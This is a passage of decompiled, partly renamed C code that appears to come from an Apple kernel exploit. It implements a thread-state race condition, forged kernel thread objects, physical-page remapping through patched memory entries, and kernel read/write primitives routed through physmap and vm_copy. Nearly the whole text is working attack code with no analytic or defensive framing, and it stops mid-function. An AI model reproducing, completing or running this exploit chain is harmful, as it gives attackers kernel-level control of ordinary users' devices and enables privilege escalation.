static inline void vmcopy_prepare_fake_thread_state(
        VmcopyRaceState *state,
        natural_t suspendedThreadState[0x44],
        uint64_t messageKaddr)
{
  memset(suspendedThreadState, 0, VMCOPY_FAKE_THREAD_STATE_BYTES);
  memset(&state->fakeThreadObject, 0, VMCOPY_FAKE_THREAD_STATE_BYTES);

  state->fakeThreadObject.threadKaddr = state->targetThreadKaddr;
  state->fakeThreadObject.ast = VMCOPY_MARKER32;
  state->fakeThreadObject.continuation = state->childThreadKaddr;
  state->fakeThreadObject.marker2 = qword_48010;
  state->fakeThreadObject.waitLink = qword_48030;
  state->fakeThreadObject.flags = 0;
  state->fakeThreadObject.messageBackptr = messageKaddr + 0x7F00;
  state->fakeThreadObject.marker = VMCOPY_MARKER64;
  state->messageKaddr = messageKaddr;
}

static inline void vmcopy_prime_fake_message_pages(__int64 kreadCtx, uint64_t messageKaddr)
{
  flush_cpu_cache(kreadCtx, messageKaddr, (int)VMCOPY_MARKER32);

  for ( int64_t pageOffset = -0x4000; pageOffset < 0x8000; pageOffset += 0x4000 )
    flush_cpu_cache(kreadCtx, messageKaddr + pageOffset + 0x8000, (int)(pageOffset + VMCOPY_MARKER32));
}

static inline uint64_t vmcopy_run_thread_state_race(
        VmcopyRaceState *state,
        const __int128 savedThreadObject[19],
        VmcopyWritePhysmapBlock writePhysmapBlock,
        semaphore_t readySemaphore,
        semaphore_t resumeSemaphore,
        uint64_t baselineNext,
        uint64_t replacementNext,
        uint64_t originalNext,
        uint64_t threadKaddr)
{
  while ( 1 )
  {
    pthread_t triggerThread = 0;
    __block __int64 triggerState = 0;

    VmcopyThreadObjectView *mappedThreadObject = (VmcopyThreadObjectView *)state->mappedThreadObject;
    memcpy(mappedThreadObject, savedThreadObject, 0x130u);
    void (^triggerThreadBlock)(void) = ^{
      vmcopy_trigger_thread_state_mod_body(state, &triggerState);
    };
    pthread_create(&triggerThread, 0, recomp_run_copied_void_block_thread, recomp_copy_void_block_thread_arg(triggerThreadBlock));
    semaphore_wait(resumeSemaphore);
    semaphore_signal(readySemaphore);

    mappedThreadObject->triggerWord = 0;
    writePhysmapBlock(8u);

    triggerState = 1;
    uint32_t *threadPolicyBits = &mappedThreadObject->policyBits;
    uint64_t *threadNext = &mappedThreadObject->next;
    uint64_t *triggered = &mappedThreadObject->triggerWord;
    uint32_t policyBits = state->threadPolicyBits;
    do
    {
      *threadPolicyBits = policyBits;
      *threadNext = replacementNext;
    }
    while ( !*triggered );

    writePhysmapBlock(1u);
    pthread_join(triggerThread, 0);

    uint64_t observedNext = kread_u64_value(
                              state->kreadCtx,
                              threadKaddr + offsetof(VmcopyThreadObjectView, next));
    if ( observedNext != baselineNext && observedNext != replacementNext && observedNext != originalNext )
    {
      VmcopyThreadObjectView *snapshot = (VmcopyThreadObjectView *)state->mappedThreadObject;
      if ( snapshot->policyBits == state->threadPolicyBits
        && observedNext
        && snapshot->waitLink == state->fakeThreadObject.marker2
        && snapshot->msgLink == state->fakeThreadObject.waitLink )
      {
        return state->mappedThreadObject;
      }
    }
  }
}

static inline void vmcopy_receive_captured_thread_exception(VmcopyRaceState *state, const void *capturedThreadObject)
{
  __int64 kreadCtx = state->kreadCtx;
  uint64_t targetThreadKaddr = state->targetThreadKaddr;

  kread_u64_value(kreadCtx, targetThreadKaddr + offsetof(VmcopyThreadObjectView, next));
  mach_port_allocate(mach_task_self_, 1u, &state->exceptionPort);
  mach_port_insert_right(
    mach_task_self_,
    state->exceptionPort,
    state->exceptionPort,
    0x14u);
  thread_set_exception_ports(
    state->capturedThreadPort,
    VMCOPY_EXCEPTION_MASK,
    state->exceptionPort,
    VMCOPY_EXCEPTION_BEHAVIOR,
    VMCOPY_EXCEPTION_FLAVOR);
  thread_resume(state->capturedThreadPort);

  mach_msg_header_t *message = (mach_msg_header_t *)calloc(1u, VMCOPY_EXCEPTION_MSG_ALLOC_SIZE);
  state->exceptionMessage = message;
  mach_msg(
    message,
    VMCOPY_EXCEPTION_BEHAVIOR,
    0,
    VMCOPY_EXCEPTION_MSG_RECV_SIZE,
    state->exceptionPort,
    0,
    0);

  kread_u64_value(kreadCtx, targetThreadKaddr + offsetof(VmcopyThreadObjectView, next));
  memcpy((void *)state->mappedThreadObject, capturedThreadObject, 0x130u);
}

static inline void vmcopy_patch_memory_entry_page(__int64 kreadCtx, __int64 pageInfoKaddr, uint32_t ppnum, __int128 scratch[2])
{
  memset(scratch, 0, 32);
  kread_via_kobject(kreadCtx, pageInfoKaddr, (__int64)scratch, 32);
  HIDWORD(scratch[0]) = ppnum;
  kwrite_u64_via_kobject(kreadCtx, pageInfoKaddr, (__int64)scratch, 32);
}

static inline vm_address_t vmcopy_map_physical_page(
        __int64 kreadCtx,
        __int64 pageInfoKaddr,
        uint32_t mappedPageRef,
        uint32_t restorePageRef,
        mem_entry_name_port_t objectHandle,
        vm_offset_t physicalOffset,
        __int128 scratch[2])
{
  vm_address_t mappedAddress = 0;

  vmcopy_patch_memory_entry_page(kreadCtx, pageInfoKaddr, mappedPageRef, scratch);
  vm_map(mach_task_self_, &mappedAddress, 0x4000u, 0, 1, objectHandle, physicalOffset, 0, 3, 3, 1u);
  vmcopy_patch_memory_entry_page(kreadCtx, pageInfoKaddr, restorePageRef, scratch);

  return mappedAddress;
}

static inline void vmcopy_install_final_fake_thread_object(
        VmcopyRaceState *state,
        __int64 pageInfoKaddr,
        uint32_t mappedPageRef,
        uint32_t restorePageRef,
        mem_entry_name_port_t objectHandle,
        uint64_t pageInfoPayload[VMCOPY_PAGE_INFO_PAYLOAD_WORDS])
{
  __int64 kreadCtx = state->kreadCtx;
  uint64_t targetThreadKaddr = state->targetThreadKaddr;
  uint64_t targetThreadPage = targetThreadKaddr & 0xFFFFFFFFFFFFC000LL;
  uint64_t targetThreadPageOffset = targetThreadKaddr & 0x3FFFLL;
  vm_address_t mappedPage = vmcopy_map_physical_page(
                              kreadCtx,
                              pageInfoKaddr,
                              mappedPageRef,
                              restorePageRef,
                              objectHandle,
                              targetThreadPage,
                              (__int128 *)pageInfoPayload);
  VmcopyThreadObjectView *mappedThreadObject = (VmcopyThreadObjectView *)(mappedPage + targetThreadPageOffset);

  state->finalThreadObject = (uint64_t)mappedThreadObject;
  mappedThreadObject->waitLink = VMCOPY_FINAL_WAIT_LINK_MARKER;
  mappedThreadObject->policyBits = 0;
  mappedThreadObject->msgLink = VMCOPY_FINAL_MSG_LINK_MARKER;
  memcpy(mappedThreadObject->fakePageMarkers, kVmcopyFakePageMarkers, sizeof(kVmcopyFakePageMarkers));
  setup_kernel_exploit_msg(
    (__int64)state,
    targetThreadKaddr,
    VMCOPY_FINAL_WAIT_LINK_MARKER,
    0,
    VMCOPY_FINAL_MSG_LINK_MARKER,
    VMCOPY_FINAL_ARG5_MARKER,
    VMCOPY_FINAL_ARG6_MARKER);

  memset(pageInfoPayload, 0, VMCOPY_PAGE_INFO_PAYLOAD_WORDS * sizeof(uint64_t));
  query_phys_page_info((__int64)state, qword_48040, (__int64)pageInfoPayload);

  uint64_t messageKaddr = state->messageKaddr;
  kwrite_u64_to_addr(kreadCtx, messageKaddr + 61448LL, messageKaddr + 61408LL);
  uint64_t vtableResult = (*(__int64 (__fastcall **)(VmcopyRaceState *))(state->vtable + 16))(state);
  kwrite_u64_to_addr(kreadCtx, messageKaddr + 61456LL, vtableResult);
}

static inline bool vmcopy_prepare_target_thread_mapping(
        VmcopyRaceState *state,
        __int64 pageInfoKaddr,
        uint32_t restorePageRef,
        mem_entry_name_port_t objectHandle,
        thread_act_t *targetThread,
        VmcopyTargetThreadMapping *out,
        __int128 scratch[2])
{
  if ( *targetThread )
    thread_terminate(*targetThread);
  thread_create(mach_task_self_, targetThread);

  __int64 kreadCtx = state->kreadCtx;
  state->capturedThreadPort = 0;
  out->taskKaddr = get_task_kobject_addr_from_field32(kreadCtx, *targetThread);
  out->originalThreadPtr = kread_u64_value(kreadCtx, qword_48008 + out->taskKaddr);
  out->threadKaddr = maybe_sptm_translate_kaddr(
                       KRWCTX_FROM_RAW_FIELD(kreadCtx, 32),
                       out->originalThreadPtr);

  if ( ((out->threadKaddr + VMCOPY_MAPPED_THREAD_POLICY_OFFSET) & VMCOPY_THREAD_CACHELINE_MASK) == VMCOPY_THREAD_POLICY_BAD_CACHELINE_OFFSET
    || (out->threadKaddr & 0x3FFF) > VMCOPY_MAPPED_THREAD_MAX_PAGE_OFFSET )
  {
    return false;
  }

  out->threadPageOffset = out->threadKaddr & 0x3FFF;
  out->threadPolicyKaddr = out->threadKaddr + VMCOPY_MAPPED_THREAD_POLICY_OFFSET;
  out->threadPageBase = out->threadKaddr & 0xFFFFFFFFFFFFC000LL;
  uint32_t mappedPageRef = state->mappedKernelTextPageRef;
  out->mappedTaskPage = vmcopy_map_physical_page(
                          kreadCtx,
                          pageInfoKaddr,
                          mappedPageRef,
                          restorePageRef,
                          objectHandle,
                          out->taskKaddr & 0xFFFFFFFFFFFFC000LL,
                          scratch);
  out->mappedThreadPage = vmcopy_map_physical_page(
                            kreadCtx,
                            pageInfoKaddr,
                            mappedPageRef,
                            restorePageRef,
                            objectHandle,
                            out->threadPageBase,
                            scratch);
  out->mappedThreadObject = out->mappedThreadPage + out->threadPageOffset;
  out->taskThreadSlot = (__int64 *)(out->mappedTaskPage + (out->taskKaddr & 0x3FFF) + qword_48008);

  return true;
}

static inline uint64_t vmcopy_prepare_thread_state_physmap_race(
        VmcopyRaceState *state,
        const VmcopyPackedMemoryEntry *memoryEntry,
        uint32_t restorePageRef,
        uint64_t pageInfoTableBase,
        uint64_t kernelVaBase,
        uint32_t pageShift,
        uint64_t kernelTextPageInfo,
        const VmcopyTargetThreadMapping *target,
        thread_act_t targetThreadForState,
        thread_act_t childThread,
        natural_t suspendedThreadState[0x44],
        VmcopyWritePhysmapBlock *writePhysmapBlock,
        __int128 savedThreadObject[19])
{
  __int64 kreadCtx = state->kreadCtx;
  uint32_t kernelTextPageRef = kread_u32_value(kreadCtx, kernelTextPageInfo);
  uint64_t targetPageInfo = vmcopy_find_page_info_for_physical(
                              kreadCtx,
                              kernelTextPageRef,
                              pageInfoTableBase,
                              kernelVaBase,
                              pageShift,
                              target->threadPageBase);
  uint64_t targetPageRef = vmcopy_page_info_ref_from_addr(targetPageInfo, pageInfoTableBase, kernelVaBase, pageShift);
  vm_address_t mappedThreadPage = vmcopy_map_physical_page(
                                    kreadCtx,
                                    memoryEntry->pageInfoDataKaddr + 48,
                                    state->mappedKernelTextPageRef,
                                    restorePageRef,
                                    memoryEntry->objectHandle,
                                    target->threadPageBase,
                                    savedThreadObject);
  state->mappedThreadObject = mappedThreadPage + target->threadPageOffset;
  flush_cpu_cache(kreadCtx, target->threadPolicyKaddr, state->threadPolicyBits);
  memcpy(savedThreadObject, (const void *)state->mappedThreadObject, VMCOPY_THREAD_OBJECT_SNAPSHOT_BYTES);

  uint64_t savedEntryPage = kread_u64_value(kreadCtx, memoryEntry->pageInfoKaddr);
  uint64_t savedTargetPageNext = kread_u64_value(kreadCtx, targetPageInfo + 8);
  *writePhysmapBlock = vmcopy_create_write_physmap_block(
    state,
    memoryEntry->pageInfoKaddr,
    targetPageRef,
    targetPageInfo,
    kernelVaBase,
    memoryEntry->size,
    pageShift,
    memoryEntry->objectHandle,
    savedTargetPageNext,
    savedEntryPage);

  uint64_t stateThreadTask = get_task_kobject_addr_from_field32(kreadCtx, targetThreadForState);
  uint64_t stateThreadPtr = kread_u64_value(kreadCtx, qword_48008 + stateThreadTask);
  state->targetThreadKaddr = krw_xpac_vaddr_2(KRWCTX_FROM_RAW_FIELD(kreadCtx, 32), stateThreadPtr);

  uint64_t childThreadTask = get_task_kobject_addr_from_field32(kreadCtx, childThread);
  uint64_t childThreadPtr = kread_u64_value(kreadCtx, qword_48008 + childThreadTask);
  state->childThreadKaddr = krw_xpac_vaddr_2(KRWCTX_FROM_RAW_FIELD(kreadCtx, 32), childThreadPtr);

  uint64_t messageKaddr = send_port_alloc_msg((__int64)state, 0x10000);
  vmcopy_prepare_fake_thread_state(state, suspendedThreadState, messageKaddr);
  vmcopy_prime_fake_message_pages(kreadCtx, messageKaddr);

  memcpy((void *)state->mappedThreadObject, savedThreadObject, VMCOPY_THREAD_OBJECT_SNAPSHOT_BYTES);
  thread_set_state(state->capturedThreadPort, 6, (thread_state_t)&state->fakeThreadObject, 0x44u);
  uint64_t baselineNext = kread_u64_value(kreadCtx, target->threadKaddr + offsetof(VmcopyThreadObjectView, next));
  memcpy((void *)state->mappedThreadObject, savedThreadObject, VMCOPY_THREAD_OBJECT_SNAPSHOT_BYTES);
  thread_set_state(state->capturedThreadPort, 6, suspendedThreadState, 0x44u);
  kread_u64_value(kreadCtx, target->threadKaddr + offsetof(VmcopyThreadObjectView, next));
  kread_u32_value(kreadCtx, target->threadPolicyKaddr);

  return baselineNext;
}

static inline uint64_t vmcopy_page_info_addr_from_ref(uint32_t ref, uint64_t packedBase, uint64_t linearBase, uint32_t pageShift)
{
  if ( (ref & 0x80000000u) != 0 )
    return packedBase + 48LL * (ref & 0x7FFFFFFFu);
  return ((uint64_t)ref << pageShift) + linearBase;
}

static inline uint64_t vmcopy_page_info_ref_from_addr(uint64_t addr, uint64_t packedBase, uint64_t linearBase, uint32_t pageShift)
{
  if ( addr >= packedBase )
    return ((addr - packedBase) / 48) | 0x80000000u;
  return (addr - linearBase) >> pageShift;
}

static inline uint64_t vmcopy_find_page_info_for_physical(
        __int64 kreadCtx,
        uint32_t firstRef,
        uint64_t packedBase,
        uint64_t linearBase,
        uint32_t pageShift,
        uint64_t physicalBase)
{
  uint64_t pageInfo = vmcopy_page_info_addr_from_ref(firstRef, packedBase, linearBase, pageShift);

  while ( kread_u64_value(kreadCtx, pageInfo + 24) != physicalBase )
  {
    uint32_t nextRef = kread_u32_value(kreadCtx, pageInfo + 8);
    pageInfo = vmcopy_page_info_addr_from_ref(nextRef, packedBase, linearBase, pageShift);
  }

  return pageInfo;
}

static inline VmcopyPackedMemoryEntry vmcopy_make_packed_memory_entry(
        __int64 kreadCtx,
        uint64_t linearPageInfoBase,
        uint32_t pageShift)
{
  VmcopyPackedMemoryEntry entry;

  do
  {
    memset(&entry, 0, sizeof(entry));
    entry.size = VMCOPY_MEMORY_ENTRY_PAGE_SIZE;

    vm_map(
      mach_task_self_,
      &entry.address,
      VMCOPY_MEMORY_ENTRY_MAPPING_SIZE,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      2u);
    entry.offset = entry.address + VMCOPY_MEMORY_ENTRY_PAGE_SIZE;
    vm_allocate(mach_task_self_, &entry.offset, entry.size, VMCOPY_MEMORY_ENTRY_PAGE_SIZE);
    *(uint64_t *)entry.offset = VMCOPY_MARKER64;
    mach_make_memory_entry(mach_task_self_, &entry.size, entry.offset, 3, &entry.objectHandle, 0);

    entry.objectKaddr = get_task_kobject_addr_from_field32(kreadCtx, entry.objectHandle);
    uint64_t objectPager = kread_u64_value(kreadCtx, entry.objectKaddr + 16);
    entry.pageInfoDataKaddr = kread_u64_value(kreadCtx, objectPager + 24);
    uint32_t linearRef = kread_u32_value(kreadCtx, entry.pageInfoDataKaddr + 60);
    entry.pageInfoKaddr = vmcopy_page_info_addr_from_ref(linearRef, 0, linearPageInfoBase, pageShift);
    entry.pageInfoTableBase = kread_u64_value(kreadCtx, entry.pageInfoKaddr + 32);
    entry.pageInfoRef = kread_u32_value(kreadCtx, entry.pageInfoKaddr);
  }
  while ( (entry.pageInfoRef & 0x80000000) == 0 );

  return entry;
}

static inline uint64_t vmcopy_find_kernel_text_page_info(
        VmcopyRaceState *state,
        uint64_t packedPageInfoBase,
        uint64_t linearPageInfoBase,
        uint32_t pageShift)
{
  __int64 kreadCtx = state->kreadCtx;
  __int64 krwCtxRaw = *(uint64_t *)(kreadCtx + 32);
  uint64_t kernelTextStart = *(uint64_t *)(krwCtxRaw + 6632);
  uint64_t kernelTextEnd = *(uint64_t *)(krwCtxRaw + 6640);

  for ( uint64_t scanOffset = 0; ; scanOffset += 48 )
  {
    uint64_t pageInfoKaddr = packedPageInfoBase + scanOffset;
    uint64_t physBase = kread_u64_value(kreadCtx, pageInfoKaddr + 24);
    if ( physBase < kernelTextStart || physBase >= kernelTextEnd || (physBase & 0x3FFF) != 0 )
      continue;

    uint32_t mappedRef = kread_u32_value(kreadCtx, pageInfoKaddr + 32);
    state->mappedKernelTextPageRef = mappedRef;
    state->reserved_0x024 = 0;
    if ( !mappedRef )
      continue;

    uint64_t mappedPageInfo = vmcopy_page_info_addr_from_ref(mappedRef, packedPageInfoBase, linearPageInfoBase, pageShift);
    if ( kread_u32_value(kreadCtx, mappedPageInfo + 48) > 0xFFF )
      return mappedPageInfo;
  }
}

static inline __int64 physmap_find_free_vm_region(vm_size_t requiredSize, vm_address_t *baseOut, vm_size_t *sizeOut)
{
  vm_address_t regionAddress = 0;
  vm_size_t regionSize = 0;
  natural_t depth = 1;
  natural_t info[19];
  mach_msg_type_number_t infoCnt;

  while ( 1 )
  {
    memset(info, 0, sizeof(info));
    infoCnt = 19;
    depth = 1;
    __int64 kr = vm_region_recurse_64(
                   mach_task_self_,
                   &regionAddress,
                   &regionSize,
                   &depth,
                   (vm_region_recurse_info_t)info,
                   &infoCnt);
    if ( (uint32_t)kr )
      return kr;
    if ( depth > 1 )
      return 5;
    if ( depth == 1 && regionSize >= requiredSize && *(memory_object_size_t *)((char *)&info[2] + 4) == 0 )
    {
      *baseOut = regionAddress;
      *sizeOut = requiredSize;
      return 0;
    }
    regionAddress += regionSize;
    regionSize = 0;
  }
}

static inline __int64 physmap_make_worker_memory_entries(
        vm_size_t mappingSize,
        vm_address_t sourceAddress,
        unsigned int workerCount,
        mach_port_t objectHandles[4],
        mach_port_t *firstObjectHandle)
{
  if ( firstObjectHandle )
    *firstObjectHandle = 0;

  for ( unsigned int i = 0; i < workerCount; ++i )
  {
    memory_object_size_t entrySize = mappingSize;
    __int64 kr = mach_make_memory_entry_64(
                   mach_task_self_,
                   &entrySize,
                   sourceAddress,
                   1,
                   &objectHandles[i],
                   0);
    if ( (uint32_t)kr )
      return kr;
    if ( entrySize != mappingSize )
      return 5;
  }

  if ( firstObjectHandle && workerCount )
    *firstObjectHandle = objectHandles[0];
  return 0;
}

static inline __int64 physmap_start_worker_threads(pthread_t *threads, unsigned int count, __int64 state)
{
  for ( unsigned int i = 0; i < count; ++i )
  {
    void *(__cdecl *entry)(void *) = (void *(__cdecl *)(void *))nullsub_1(acquire_physmap_page_atomic);
    if ( pthread_create(&threads[i], 0, entry, (void *)state) )
      return 5;
  }
  return 0;
}

static inline __int64 physmap_join_worker_threads(pthread_t *threads, unsigned int count)
{
  for ( unsigned int i = 0; i < count; ++i )
  {
    if ( !threads[i] )
      continue;
    __int64 kr = pthread_join(threads[i], 0);
    if ( (uint32_t)kr )
      return kr;
    threads[i] = 0;
  }
  return 0;
}

//----- (00000000000068F4) ----------------------------------------------------
void __fastcall deallocate_physmap_pages(__int64 a1)
{
  __int64 i; // x21
  __int64 v3; // x22
  vm_address_t v4; // x1
  unsigned __int64 v5; // x21
  __int64 v6; // x22
  __int64 v7; // x23

  for ( i = 0; i != 1024000; i += 16 )
  {
    v3 = *(uint64_t *)(a1 + 8);
    v4 = *(uint64_t *)(v3 + i);
    if ( v4 )
    {
      vm_deallocate(mach_task_self_, v4, 0x4000u);
      *(uint64_t *)(v3 + i) = 0;
    }
  }
  v5 = *(uint64_t *)(a1 + 24);
  if ( v5 < *(uint64_t *)(a1 + 32) )
  {
    v6 = 16 * v5;
    do
    {
      v7 = *(uint64_t *)(a1 + 16);
      vm_deallocate(mach_task_self_, *(uint64_t *)(v7 + v6), 0x4000u);
      *(uint64_t *)(v7 + v6) = 0;
      ++v5;
      v6 += 16;
    }
    while ( v5 < *(uint64_t *)(a1 + 32) );
  }
  free(*(void **)(a1 + 8));
  free(*(void **)(a1 + 16));
  free((void *)a1);
}
// 69A8: variable 'vars8' is possibly undefined

//----- (00000000000069B8) ----------------------------------------------------
__int64 __fastcall acquire_physmap_page(__int64 a1)
{
  mem_entry_name_port_t v1; // w19
  __int64 v2; // x8
  unsigned __int8 *v3; // x21
  unsigned __int8 v4; // w8
  vm_address_t address; // [xsp+18h] [xbp-38h] BYREF

  v1 = *(uint32_t *)a1;
  v2 = *(uint64_t *)(a1 + 8);
  atomic_fetch_add((atomic_uint *volatile)(v2 + 24), 1u);
  v3 = (unsigned __int8 *)(v2 + 28);
  LOBYTE(v2) = atomic_load((unsigned __int8 *)(v2 + 28));
  if ( (v2 & 1) == 0 )
  {
    do
    {
      address = 0;
      vm_map(mach_task_self_, &address, 0x4000u, 0, 0, v1, 0, 1, 1, 1, 1u);
      v4 = atomic_load(v3);
    }
    while ( (v4 & 1) == 0 );
  }
  return 0;
}

//----- (0000000000006A54) ----------------------------------------------------
__int64 __fastcall start_physmap_worker_thread(__int64 a1, mem_entry_name_port_t *a2)
{
  __int64 v4; // x23
  pthread_t *v5; // x21
  __int128 *v6; // x22
  void *(__cdecl *v7)(void *); // x0
  unsigned int v8; // w8
  __int64 v9; // x20
  mach_port_t object_handle; // [xsp+4h] [xbp-ACh] BYREF
  memory_object_size_t size; // [xsp+8h] [xbp-A8h] BYREF
  __int128 v13[4]; // [xsp+10h] [xbp-A0h] BYREF
  __int128 v14[2]; // [xsp+50h] [xbp-60h] BYREF

  v4 = 0;
  atomic_store(0, (unsigned int *)(a1 + 24));
  atomic_store(0, (unsigned __int8 *)(a1 + 28));
  memset(v14, 0, sizeof(v14));
  memset(v13, 0, sizeof(v13));
  v5 = (pthread_t *)v14;
  v6 = v13;
  do
  {
    *(uint32_t *)v6 = a2[v4];
    *((uint64_t *)v6 + 1) = a1;
    v7 = (void *(__cdecl *)(void *))nullsub_1(acquire_physmap_page);
    if ( pthread_create(v5, 0, v7, v6) )
      __error();
    ++v4;
    ++v5;
    ++v6;
  }
  while ( v4 != 4 );
  while ( 1 )
  {
    v8 = atomic_load((unsigned int *)(a1 + 24));
    if ( v8 == 4 )
      break;
    usleep(0x3E8u);
  }
  size = 0x4000;
  object_handle = 0;
  mach_make_memory_entry_64(mach_task_self_, &size, 0, 1, &object_handle, *a2);
  v9 = 0;
  atomic_store(1u, (unsigned __int8 *)(a1 + 28));
  do
  {
    if ( pthread_join(*(pthread_t *)((char *)v14 + v9), 0) )
      __error();
    v9 += 8;
  }
  while ( v9 != 32 );
  return object_handle;
}
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (0000000000006BBC) ----------------------------------------------------
__int64 __fastcall request_physmap_page(uint64_t *a1, __int64 a2)
{
  PhysmapPagePorts *ports = (PhysmapPagePorts *)a2;
  vm_address_t *v4; // x21
  __int64 v5; // x24
  unsigned __int64 v6; // x0
  __int64 v7; // x1
  __int64 v8; // x22
  __int64 v9; // x25
  mach_port_name_t v10; // w20
  unsigned __int64 v11; // x0
  __int64 v12; // x19
  unsigned __int64 v14; // x24
  memory_object_size_t v15; // x9
  unsigned __int64 v16; // x8
  mach_port_name_t v17; // w1
  memory_object_size_t size; // [xsp+10h] [xbp-60h] BYREF
  mem_entry_name_port_t object[4]; // [xsp+18h] [xbp-50h] BYREF

  v4 = (vm_address_t *)get_vm_region_slot(a1);
  thread_switch(0, 2, 0);
  vm_deallocate(mach_task_self_, *v4, 0x4000u);
  v5 = 0;
  *v4 = 0;
  *(uint64_t *)object = 0;
  *(uint64_t *)&object[2] = 0;
  do
  {
    size = 0x4000;
    mach_make_memory_entry_64(mach_task_self_, &size, a1[2], 1, &object[v5++], 0);
  }
  while ( v5 != 4 );
  size = 0;
  vm_map(mach_task_self_, &size, 0x4000u, 0, 1, object[0], 0, 0, 1, 1, 1u);
  vm_region_nesting_result nesting = query_vm_region_nesting(size);
  v6 = nesting.packed_info;
  if ( nesting.object_id != v4[1] )
    goto LABEL_6;
  v8 = nesting.object_id;
  v9 = (unsigned int)(HIDWORD(v6) + 1);
  v10 = start_physmap_worker_thread((__int64)a1, object);
  v11 = query_vm_region_nesting(size).packed_info;
  if ( v9 == HIDWORD(v11) )
  {
    mach_port_deallocate(mach_task_self_, v10);
LABEL_6:
    vm_deallocate(mach_task_self_, size, 0x4000u);
    v12 = 0;
    size = 0;
    do
    {
      mach_port_deallocate(mach_task_self_, object[v12]);
      object[v12++] = 0;
    }
    while ( v12 != 4 );
    return 0;
  }
  v14 = 0;
  v15 = size;
  ports->objectId = v8;
  ports->mappedAddress = v15;
  ports->workerMemoryEntry = v10;
  v16 = v9 + ~HIDWORD(v11);
  ports->retainedHandleCount = v16;
  while ( 1 )
  {
    v17 = object[v14];
    if ( v14 >= v16 )
    {
      mach_port_deallocate(mach_task_self_, v17);
      object[v14] = 0;
    }
    else
    {
      ports->objectHandles[v14] = v17;
    }
    if ( v14 == 3 )
      break;
    v16 = ports->retainedHandleCount;
    ++v14;
  }
  return 1;
}
// 6CAC: variable 'v7' is possibly undefined

//----- (0000000000006DC0) ----------------------------------------------------
__int64 __fastcall physmap_read_dword(uint64_t *a1, unsigned __int64 a2, uint32_t *a3)
{
  __int64 v5; // x21
  unsigned __int64 v6; // x8
  vm_address_t v7; // x1
  __int64 result; // x0

  v5 = a2 & 0x3FFF;
  v6 = a2 >> 14;
  v7 = a1[169];
  *(uint32_t *)(v7 + 560) = v6;
  vm_copy(mach_task_self_, v7, 0xC000u, a1[170]);
  result = vm_remap_inplace(a1[172], 0x4000u, 0);
  *a3 = *(uint32_t *)(a1[172] + v5);
  return result;
}

//----- (0000000000006E30) ----------------------------------------------------
void *__fastcall physmap_read_aligned(uint64_t *a1, unsigned __int64 a2, void *a3, size_t a4)
{
  __int64 v7; // x22
  unsigned __int64 v8; // x8
  vm_address_t v9; // x1

  v7 = a2 & 0x3FFF;
  v8 = a2 >> 14;
  v9 = a1[169];
  *(uint32_t *)(v9 + 560) = v8;
  vm_copy(mach_task_self_, v9, 0xC000u, a1[170]);
  vm_copy(mach_task_self_, a1[172], 0xC000u, a1[173]);
  return memcpy(a3, (const void *)(a1[173] + v7), a4);
}

//----- (0000000000006EB8) ----------------------------------------------------
__int64 __fastcall physmap_write_aligned(uint64_t *a1, const void *a2, unsigned __int64 a3, size_t a4)
{
  __int64 v7; // x24
  vm_address_t v8; // x1
  void *v9; // x23
  vm_address_t v10; // x21
  vm_map_t v11; // w0

  v7 = a3 & 0x3FFF;
  v8 = a1[169];
  *(uint32_t *)(v8 + 560) = a3 >> 14;
  vm_copy(mach_task_self_, v8, 0xC000u, a1[170]);
  v9 = (void *)(a1[175] - a4 + 0x4000);
  v10 = a1[176] + v7;
  memcpy(v9, a2, a4);
  v11 = mach_task_self_;
  return vm_copy(v11, (vm_address_t)v9, a4 + 0x8000, v10);
}
// 6F58: variable 'vars8' is possibly undefined

//----- (0000000000006F68) ----------------------------------------------------
unsigned __int64 __fastcall build_physmap_page_table(uint64_t *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // x19
  uint64_t *v3; // x20
  unsigned __int64 v4; // x21
  __int64 v5; // x23
  __int64 v6; // x8
  unsigned __int64 v7; // x26
  __int64 v8; // x8
  uint64_t v10[2048]; // [xsp+8h] [xbp-4058h] BYREF

  v2 = a2;
  v3 = a1;
  v4 = a1[164];
  bzero(v10, 0x4000u);
  v5 = 0;
  while ( 1 )
  {
    if ( v5 || (v6 = v3[165]) == 0 )
      v6 = *(uint64_t *)((char *)&unk_42DC8 + v5 + 80);
    v7 = (v6 & v2) >> *(uint64_t *)((char *)&unk_42DC8 + v5 + 72);
    physmap_read_aligned(v3, v4, v10, 0x4000u);
    v8 = v10[(unsigned int)v7];
    if ( (*(uint64_t *)((uint8_t *)&unk_42DC8 + v5 + 88) & ~v8) != 0 )
      return 0;
    if ( (*(uint64_t *)((uint8_t *)&unk_42DC8 + v5 + 96) & v8) == *(uint64_t *)((char *)&unk_42DC8 + v5 + 104) )
      break;
    v4 = v8 & 0xFFFFFFFFC000LL;
    v5 += 56;
    if ( v5 == 168 )
      return 0;
  }
  return (v8 & ~*(uint64_t *)((char *)&unk_42DC8 + v5 + 64) & 0xFFFFFFFFF000LL)
       | (*(uint64_t *)((uint8_t *)&unk_42DC8 + v5 + 64) & v2);
}
// 6FA0: variable 'v1' is possibly undefined
// 48940: using guessed type __int64 __chkstk_darwin(void);
// 48940: using guessed type __int64 __fastcall __chkstk_darwin(uint64_t, uint64_t);

//----- (00000000000070A4) ----------------------------------------------------
uint64_t *__fastcall iogpu_kread_loop(uint64_t *result, __int16 a2, char *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // x19
  uint64_t *v7; // x22
  size_t v8; // x23
  unsigned __int64 v9; // x0

  if ( a4 )
  {
    v4 = a4;
    v7 = result;
    do
    {
      if ( v4 >= 0x4000 - (unsigned __int64)(a2 & 0x3FFF) )
        v8 = 0x4000LL - (a2 & 0x3FFF);
      else
        v8 = v4;
      v9 = build_physmap_page_table(v7, a2);
      result = physmap_read_aligned(v7, v9, a3, v8);
      a2 += v8;
      a3 += v8;
      v4 -= v8;
    }
    while ( v4 );
  }
  return result;
}

//----- (0000000000007128) ----------------------------------------------------
uint64_t *__fastcall iogpu_kwrite_loop(uint64_t *result, char *a2, __int16 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // x19
  uint64_t *v7; // x22
  size_t v8; // x23
  unsigned __int64 v9; // x0

  if ( a4 )
  {
    v4 = a4;
    v7 = result;
    do
    {
      if ( v4 >= 0x4000 - (unsigned __int64)(a3 & 0x3FFF) )
        v8 = 0x4000LL - (a3 & 0x3FFF);
      else
        v8 = v4;
      v9 = build_physmap_page_table(v7, a3);
      result = (uint64_t *)physmap_write_aligned(v7, a2, v9, v8);
      a2 += v8;
      a3 += v8;
      v4 -= v8;
    }
    while ( v4 );
  }
